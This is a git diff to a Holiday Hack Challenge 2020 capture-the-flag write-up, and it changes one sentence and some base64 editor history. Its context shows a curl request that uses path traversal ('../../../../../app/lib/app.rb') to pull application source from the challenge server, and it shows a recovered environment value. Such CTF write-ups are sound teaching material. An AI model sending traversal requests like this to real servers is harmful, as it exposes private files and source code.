@@ -26,7 +26,7 @@ So the `GREETZ` variable contains **JackFrostWasHere**
 
 ## Solution using RCE
 
-The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-8/app.rb) can be downloaded through
+The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-8/app.rb) can be downloaded through the above path traversal:
 ```
 curl https://tag-generator.kringlecastle.com/image?id=../../../../../app/lib/app.rb --output app.rb
 ```
@@ -45,7 +45,8 @@ GREETZ=JackFrostWasHere
 [..]
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTE1MTU1Njg5NiwyMzg0NjAyNzIsMTkzMz
-M2MTc4NywtMTQ2NzYxNTI2MiwtMjQzOTQyODY2LDEzMTIwNTY0
-NTMsOTIwNDU1ODY1LC0xNjA2MDc4MDQwXX0=
+eyJoaXN0b3J5IjpbLTM5ODQ5MTQ2MSwxMTUxNTU2ODk2LDIzOD
+Q2MDI3MiwxOTMzMzYxNzg3LC0xNDY3NjE1MjYyLC0yNDM5NDI4
+NjYsMTMxMjA1NjQ1Myw5MjA0NTU4NjUsLTE2MDYwNzgwNDBdfQ
+==
 -->
